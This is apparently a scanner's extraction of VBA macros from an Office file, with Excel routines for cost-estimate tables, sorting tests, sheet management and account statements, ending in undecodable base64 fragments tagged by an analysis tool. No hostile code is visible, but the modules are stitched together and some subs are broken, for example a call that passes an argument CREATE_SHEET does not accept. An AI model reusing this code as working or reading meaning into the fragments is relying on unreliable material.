        newRng.Offset(i + 2, 10).FormulaR1C1 = "=ROUNDUP(RC[-5]*" & transVal & ",2)"
        newRng.Offset(i + 2, 10).EntireColumn.AutoFit
        newRng.Offset(i + 2, 10).NumberFormat = "#,##"
        newRng.Offset(i + 2, 11).FormulaR1C1 = "=ROUNDUP(RC[-6]*" & toolsVal & ",2)"
        newRng.Offset(i + 2, 11).EntireColumn.AutoFit
        newRng.Offset(i + 2, 11).NumberFormat = "#,##"
        newRng.Offset(i + 2, 12).FormulaR1C1 = "=ROUNDUP(RC[-7]*" & consVal & ",2)"
        newRng.Offset(i + 2, 12).EntireColumn.AutoFit
        newRng.Offset(i + 2, 12).NumberFormat = "#,##"
End Sub



Sub DisplayResult_Injection()
        '------------DISPLAY SETTING FOR VALUES----------------
        
        valMH = Application.WorksheetFunction.RoundUp(valMH, 2)
        consVal = Application.WorksheetFunction.RoundUp(consVal, 2)
        toolsVal = Application.WorksheetFunction.RoundUp(toolsVal, 2)
        transVal = Application.WorksheetFunction.RoundUp(transVal, 2)
        
        Range(newRng.Offset(2, 0), newRng.Offset(2, 12)).Interior.Color = vbBlack
        Range(newRng.Offset(2, 0), newRng.Offset(2, 12)).Font.Color = vbWhite
        newRng.Offset(2, 0).Value = "System Name"
        newRng.Offset(2, 0).Font.Bold = True
        newRng.Offset(2, 1).Value = "Mat Cost"
        newRng.Offset(2, 1).Font.Bold = True
        newRng.Offset(2, 2).Value = "Unit Cost"
        newRng.Offset(2, 2).Font.Bold = True
        
        newRng.Offset(2, 3).Value = "Total Cost"
        newRng.Offset(2, 3).Font.Bold = True
        newRng.Offset(2, 4).Value = "Manhours"
        newRng.Offset(2, 4).Font.Bold = True
        newRng.Offset(2, 5).Value = "Total QTY"
        newRng.Offset(2, 5).Font.Bold = True
        
        newRng.Offset(2, 6).Value = "Price @ " & pVal & "%"
        newRng.Offset(2, 6).Font.Bold = True
        newRng.Offset(2, 7).Value = "Total Price"
        newRng.Offset(2, 7).Font.Bold = True
        newRng.Offset(2, 8).Value = "%age"
        newRng.Offset(2, 8).Font.Bold = True
        
        newRng.Offset(2, 9).Value = "Mat."
        newRng.Offset(2, 9).Font.Bold = True
        newRng.Offset(2, 10).Value = "Trans."
        newRng.Offset(2, 10).Font.Bold = True
        newRng.Offset(2, 11).Value = "T & E"
        newRng.Offset(2, 11).Font.Bold = True
        newRng.Offset(2, 12).Value = "Cons."
        newRng.Offset(2, 12).Font.Bold = True
        
        '----------ACTUAL VALUE CALCULATIONS------------
        newRng.Offset(i + 2, 0).Value = ws.Name
        newRng.Offset(i + 2, 0).EntireColumn.AutoFit
        newRng.Offset(i + 2, 1).FormulaR1C1 = "=ROUNDUP(RC[8]/RC[4],2)"
        newRng.Offset(i + 2, 1).EntireColumn.AutoFit
        newRng.Offset(i + 2, 1).NumberFormat = "#,##.00"
        newRng.Offset(i + 2, 2).FormulaR1C1 = "=ROUNDUP(" & "(SUM(RC[7]:RC[10])+(RC[2]*" & rateVal & "))/(RC[3]),2)"
        newRng.Offset(i + 2, 2).EntireColumn.AutoFit
        newRng.Offset(i + 2, 2).NumberFormat = "#,##.00"
        
        newRng.Offset(i + 2, 3).FormulaR1C1 = "=ROUNDUP(RC[2]*RC[-1],2)"
        newRng.Offset(i + 2, 3).NumberFormat = "#,##"
        newRng.Offset(i + 2, 3).EntireColumn.AutoFit
        newRng.Offset(i + 2, 4).Value = valMH
        newRng.Offset(i + 2, 4).NumberFormat = "#,##"
        newRng.Offset(i + 2, 4).EntireColumn.AutoFit
        newRng.Offset(i + 2, 5).Value = Format(valArea, "#,##0")
        newRng.Offset(i + 2, 5).EntireColumn.AutoFit
        
        newRng.Offset(i + 2, 6).FormulaR1C1 = "=ROUNDUP(" & "RC[-4]/(1-" & (pVal / 100) & "),0)"
        newRng.Offset(i + 2, 6).NumberFormat = "#,##"
        newRng.Offset(i + 2, 6).EntireColumn.AutoFit
        newRng.Offset(i + 2, 7).FormulaR1C1 = "=(RC[-1]*RC[-2])" 'Relative Ref.
        newRng.Offset(i + 2, 7).EntireColumn.AutoFit
        newRng.Offset(i + 2, 7).NumberFormat = "#,##0"
        priceVal = priceVal + newRng.Offset(i + 2, 6).Value
        newRng.Offset(i + 2, 8).FormulaR1C1 = "=(RC[-2]-RC[-6])/RC[-2]" 'Relative Ref. for %age
        newRng.Offset(i + 2, 8).EntireColumn.AutoFit
        newRng.Offset(i + 2, 8).Style = "Percent"
        
        
        newRng.Offset(i + 2, 9).Value = valMat
        newRng.Offset(i + 2, 9).EntireColumn.AutoFit
        newRng.Offset(i + 2, 9).NumberFormat = "#,##"
        newRng.Offset(i + 2, 10).Value = transVal
        newRng.Offset(i + 2, 10).EntireColumn.AutoFit
        newRng.Offset(i + 2, 10).NumberFormat = "#,##"
        newRng.Offset(i + 2, 11).Value = toolsVal
        newRng.Offset(i + 2, 11).EntireColumn.AutoFit
        newRng.Offset(i + 2, 11).NumberFormat = "#,##"
        newRng.Offset(i + 2, 12).Value = consVal
        newRng.Offset(i + 2, 12).EntireColumn.AutoFit
        newRng.Offset(i + 2, 12).NumberFormat = "#,##"

End Sub

'----------------DISPLAY ROUTINE FOR CIVIL WORKS SUMMARY-------------
Sub DisplayResult_Civil()
        '------------DISPLAY SETTING FOR VALUES----------------
        
        valMH = Application.WorksheetFunction.RoundUp(valMH, 2)
        consVal = Application.WorksheetFunction.RoundUp(consVal, 2)
        toolsVal = Application.WorksheetFunction.RoundUp(toolsVal, 2)
        transVal = Application.WorksheetFunction.RoundUp(transVal, 2)
        
        If counter < 2 Then
            Range(newRng.Offset(1, 0), newRng.Offset(1, 9)).Font.Color = vbBlue
            newRng.Offset(1, 0).Value = "QTN # " & valQtn
            newRng.Offset(1, 2).Value = "DATED: "
            newRng.Offset(1, 3).Value = valDate
            newRng.Offset(1, 3).Value = Format(valDate, "dd-mm-yy")
            newRng.Offset(1, 6).Value = "CLIENT: "
            newRng.Offset(1, 7).Value = valClient
        Else
        End If
        
        Range(newRng.Offset(2, 0), newRng.Offset(2, 12)).Interior.Color = vbBlack
        Range(newRng.Offset(2, 0), newRng.Offset(2, 12)).Font.Color = vbWhite
        newRng.Offset(2, 0).Value = "System Name"
        newRng.Offset(2, 0).Font.Bold = True
        newRng.Offset(2, 1).Value = "Mat Cost"
        newRng.Offset(2, 1).Font.Bold = True
        newRng.Offset(2, 2).Value = "Unit Cost"
        newRng.Offset(2, 2).Font.Bold = True
        
        newRng.Offset(2, 3).Value = "Total Cost"
        newRng.Offset(2, 3).Font.Bold = True
        newRng.Offset(2, 4).Value = "Manhours"
        newRng.Offset(2, 4).Font.Bold = True
        newRng.Offset(2, 5).Value = "Total QTY"
        newRng.Offset(2, 5).Font.Bold = True
        
        newRng.Offset(2, 6).Value = "Price at " & pVal & "%"
        newRng.Offset(2, 6).Font.Bold = True
        newRng.Offset(2, 7).Value = "Total Price"
        newRng.Offset(2, 7).Font.Bold = True
        newRng.Offset(2, 8).Value = "%age"
        newRng.Offset(2, 8).Font.Bold = True
        
        newRng.Offset(2, 9).Value = "Mat."
        newRng.Offset(2, 9).Font.Bold = True
        newRng.Offset(2, 10).Value = "Trans."
        newRng.Offset(2, 10).Font.Bold = True
        newRng.Offset(2, 11).Value = "T & E"
        newRng.Offset(2, 11).Font.Bold = True
        newRng.Offset(2, 12).Value = "Cons."
        newRng.Offset(2, 12).Font.Bold = True
        
        '----------ACTUAL VALUE CALCULATIONS------------
        newRng.Offset(i + 2, 0).Value = valSys
        newRng.Offset(i + 2, 0).EntireColumn.AutoFit
        newRng.Offset(i + 2, 1).Value = Format(valMat, "###.00")
        newRng.Offset(i + 2, 1).EntireColumn.AutoFit
        newRng.Offset(i + 2, 2).Value = Format(valTotal, "###.00")
        newRng.Offset(i + 2, 2).EntireColumn.AutoFit
        
        newRng.Offset(i + 2, 3).FormulaR1C1 = "=ROUNDUP(RC[2]*RC[-1],2)"
        newRng.Offset(i + 2, 3).NumberFormat = "#,##"
        newRng.Offset(i + 2, 3).EntireColumn.AutoFit
        newRng.Offset(i + 2, 4).FormulaR1C1 = "=ROUNDUP(RC[1]*" & valMH & ",2)"
        newRng.Offset(i + 2, 4).NumberFormat = "#,##"
        newRng.Offset(i + 2, 4).EntireColumn.AutoFit
        newRng.Offset(i + 2, 5).Value = Format(AreaVal, "#,##0")
        newRng.Offset(i + 2, 5).EntireColumn.AutoFit
        
        newRng.Offset(i + 2, 6).FormulaR1C1 = "=ROUNDUP(" & "RC[-4]/(1-" & (pVal / 100) & "),0)"
        newRng.Offset(i + 2, 6).NumberFormat = "#,##"
        newRng.Offset(i + 2, 6).EntireColumn.AutoFit
        newRng.Offset(i + 2, 7).FormulaR1C1 = "=(RC[-1]*RC[-2])" 'Relative Ref.
        newRng.Offset(i + 2, 7).EntireColumn.AutoFit
        newRng.Offset(i + 2, 7).NumberFormat = "#,##0"
        priceVal = priceVal + newRng.Offset(i + 2, 6).Value
        newRng.Offset(i + 2, 8).FormulaR1C1 = "=(RC[-2]-RC[-6])/RC[-2]" 'Relative Ref. for %age
        newRng.Offset(i + 2, 8).EntireColumn.AutoFit
        newRng.Offset(i + 2, 8).Style = "Percent"
        
        
        newRng.Offset(i + 2, 9).FormulaR1C1 = "=ROUNDUP(RC[-4]*RC[-8],2)"
        newRng.Offset(i + 2, 9).EntireColumn.AutoFit
        newRng.Offset(i + 2, 9).NumberFormat = "#,##"
        newRng.Offset(i + 2, 10).FormulaR1C1 = "=ROUNDUP(RC[-5]*" & transVal & ",2)"
        newRng.Offset(i + 2, 10).EntireColumn.AutoFit
        newRng.Offset(i + 2, 10).NumberFormat = "#,##"
        newRng.Offset(i + 2, 11).FormulaR1C1 = "=ROUNDUP(RC[-6]*" & toolsVal & ",2)"
        newRng.Offset(i + 2, 11).EntireColumn.AutoFit
        newRng.Offset(i + 2, 11).NumberFormat = "#,##"
        newRng.Offset(i + 2, 12).FormulaR1C1 = "=ROUNDUP(RC[-7]*" & consVal & ",2)"
        newRng.Offset(i + 2, 12).EntireColumn.AutoFit
        newRng.Offset(i + 2, 12).NumberFormat = "#,##"
End Sub


Private Sub TestOfSortObject()
    Dim targetCol As VBA.Collection
    Set targetCol = New VBA.Collection
    
    Dim zeroCol As VBA.Collection
    Set zeroCol = New VBA.Collection
    
    Dim oneCol As VBA.Collection
    Set oneCol = New VBA.Collection
    oneCol.Add 1
    
    Dim twoCol As VBA.Collection
    Set twoCol = New VBA.Collection
    twoCol.Add 2
    twoCol.Add 2
    
    
    With targetCol
        .Add twoCol
        .Add zeroCol
        .Add oneCol
    End With
    
    Dim ascendCol As VBA.Collection
    Set ascendCol = SortObject(targetCol, "Count", VbMethod, True)
    
    With ascendCol
        Debug.Assert .Item(1) Is zeroCol
        Debug.Assert .Item(2) Is oneCol
        Debug.Assert .Item(3) Is twoCol
    End With
    
    
    Dim desecndCol As VBA.Collection
    Set desecndCol = SortObject(targetCol, "Count", VbMethod, False)
    
    With desecndCol
        Debug.Assert .Item(1) Is twoCol
        Debug.Assert .Item(2) Is oneCol
        Debug.Assert .Item(3) Is zeroCol
    End With
    
    Stop
    
End Sub


Private Sub TestOfSort1DimValueArray()
    Dim a() As Variant
    a = Array(1, "a", "A", "b")
    
    Dim b() As Variant
    b = Sort1DimValueArray(a, True, vbBinaryCompare)
    
    Debug.Assert "1Aab" = VBA.Strings.Join(b, VBA.Constants.vbNullString)
    
    Dim c() As Variant
    c = Sort1DimValueArray(a, True, vbTextCompare)
    
    Debug.Assert "1aAb" = VBA.Strings.Join(c, VBA.Constants.vbNullString)
    
    Dim d() As Variant
    d = Sort1DimValueArray(a, False, vbBinaryCompare)
    
    Debug.Assert "baA1" = VBA.Strings.Join(d, VBA.Constants.vbNullString)
    
    Stop
End Sub

Sub ADD_TEST_SHEET()
   Worksheets(1).Select
   maxNo = Range("D3").Value
   Dim i As Long
   For i = 1 To maxNo
       CREATE_SHEET (i)
   Next i
   Worksheets(1).Select
End Sub


Sub CREATE_SHEET()
   Worksheets.Add After:=Worksheets(Worksheets.count)
   ct = i & 0
   ActiveSheet.Name = Format(ct, "000")
End Sub

Sub ALL_DELETE()
   Dim i As Long
   Application.DisplayAlerts = False
   For i = 2 To Worksheets.count
   Application.DisplayAlerts = False
       Worksheets(2).Delete
   Next i
   Application.DisplayAlerts = True
End Sub


Sub Make_SOA2()

'Declaration of various variables
Dim accntRng As Range, testRng As Range, ws As Worksheet, wsTest As Worksheet, wb As Workbook
Dim cell_count As Integer, count As Integer, varUnique As Variant
Dim resultRng As Range

'We don't want screen updating or alerts during execution
Application.ScreenUpdating = False
Application.DisplayAlerts = False

'wb is this workbook. May be used later for various functions.
Set wb = Application.ThisWorkbook
Set ws = ThisWorkbook.Worksheets("SAP")
Set wsTest = ThisWorkbook.Worksheets("test")

'Total No. of records in accounts range
Dim accntLastRow As Integer
accntLastRow = ws.Range("B65536").End(xlUp).Row
Set accntRng = ws.Range("B2:B" & accntLastRow)
Set testRng = wsTest.Range("A1")

'Below snippet will take unique values from the accounts column and treat it as account holders list
'accntRng.AdvancedFilter Action:=xlFilterCopy, CopyToRange:=testRng, Unique:=True
Dim lastRow As Integer
lastRow = wsTest.Range("A65536").End(xlUp).Row
Set resultRng = wsTest.Range("A1:A" & lastRow)
cell_count = resultRng.Cells.count
MsgBox "count is: " & cell_count

wsTest.Activate

'Below CALL will create new sheets based on unique customer names
Call AddSheets

Dim rCell As Range, tCell As Range, flag As Boolean
'MAIN algorithm for data gathering goes below
'////////////////////////////////////////
flag = True

For Each rCell In resultRng
Sheets("SOA_" & rCell.Value).Range("D7").Value = rCell.Value
Sheets("SOA_" & rCell.Value).Range("D8").Value = "Cusomer_" & rCell.Value
Sheets("SOA_" & rCell.Value).Range("D9").Value = "CITY_" & rCell.Value
        
        If (flag = True) Then
            count = 0
            flag = False
        Else
            count = 0
            flag = True
        End If
    
   For Each tCell In accntRng
    If (tCell.Value = rCell.Value) Then
        count = count + 1
        Sheets("SOA_" & rCell.Value).Range("A10").Offset(count, 2) = rCell.Value                      'Populate SAME account number
        Sheets("SOA_" & rCell.Value).Range("A10").Offset(count, 3) = "Cust Name: " & rCell.Value      'Populate Customer's name
        Sheets("SOA_" & rCell.Value).Range("A10").Offset(count, 4) = "Doctor: " & rCell.Value         'Populate Doctor's name
        Sheets("SOA_" & rCell.Value).Range("A10").Offset(count, 5) = "Inv: " & tCell.Offset(0, 5).Value   'Populate Invoice Ref
        Sheets("SOA_" & rCell.Value).Range("A10").Offset(count, 8) = tCell.Offset(0, 7).Value             'Populate Invoice Amount
        Sheets("SOA_" & rCell.Value).Range("A10").Offset(count, 9) = tCell.Offset(0, 3).Value             'Populate Date Value
    End If
   Next
Next

Application.ScreenUpdating = True
Application.DisplayAlerts = True

End Sub

'--------------------------------------------
'Below portion is only for addition of sheets
'--------------------------------------------

Sub AddSheets()
    Dim xRg As Range
    Dim wSh As Worksheet, wBk As Workbook
    Set wBk = ActiveWorkbook
    Set wSh = wBk.Worksheets("SOABlank")
    
    Dim rngNames As Range, lastRow As Integer, i As Integer
    
    Application.ScreenUpdating = False
    lastRow = Range("A65536").End(xlUp).Row
    Set rngNames = Range("A1:A" & lastRow)
    Dim range_Cells As Integer
    range_Cells = rngNames.Cells.count
    
    
    For Each xRg In rngNames
        With wBk
            wSh.Activate
            wSh.Copy After:=ActiveWorkbook.Sheets("SOABlank")
            On Error Resume Next
            ActiveSheet.Name = "SOA_" & xRg.Value
            If Err.Number = 1004 Then
              Debug.Print xRg.Value & " already used as a sheet name"
            End If
            On Error GoTo 0
        End With
    Next xRg
    Application.ScreenUpdating = True
End Sub

Attribute VB_Name = "ThisDocument"
Attribute VB_Base = "1Normal.ThisDocument"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = True
Attribute VB_TemplateDerived = True
Attribute VB_Customizable = True

' InQuest injected base64 decoded content
' @S<8
' A?JA
' I5&%5*
' .QZC;
' 	C4GR
' [7-(&9

INQUEST-PP=macro
